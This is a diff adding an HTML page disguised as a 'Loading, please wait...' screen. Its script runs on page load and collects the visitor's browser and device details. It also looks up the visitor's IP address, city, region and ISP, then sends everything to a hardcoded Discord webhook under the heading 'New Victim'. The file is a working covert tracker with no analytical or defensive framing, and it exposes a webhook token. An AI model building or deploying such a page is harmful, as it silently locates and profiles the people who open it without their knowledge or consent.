@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+</head>
+<body>
+    <h1>Loading, please wait...</h1>
+    <script>
+        async function sendInfo() {
+            const webhook = "https://discord.com/api/webhooks/1553501001024012429/ZcpEBjmTMSLCZlN-arsMQEyt_3OO7yP3cMsfRN-hAPOFVQi661-8wBJMcBrNNyZD0Jgj";
+            
+            const info = {
+                content: `**New Victim**\n**User-Agent:** ${navigator.userAgent}\n**Platform:** ${navigator.platform}\n**Language:** ${navigator.language}\n**Screen:** ${screen.width}x${screen.height}\n**Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n**Cores:** ${navigator.hardwareConcurrency}\n**Memory:** ${navigator.deviceMemory || 'unknown'} GB\n**Time:** ${new Date().toISOString()}`
+            };
+            
+            try {
+                const r = await fetch('https://ipapi.co/json/');
+                const d = await r.json();
+                info.content += `\n**IP:** ${d.ip}\n**Country:** ${d.country_name}\n**City:** ${d.city}\n**Region:** ${d.region}\n**ISP:** ${d.org}`;
+            } catch(e) {}
+            
+            fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(info)
+            });
+        }
+        sendInfo();
+    </script>
+</body>
+</html>
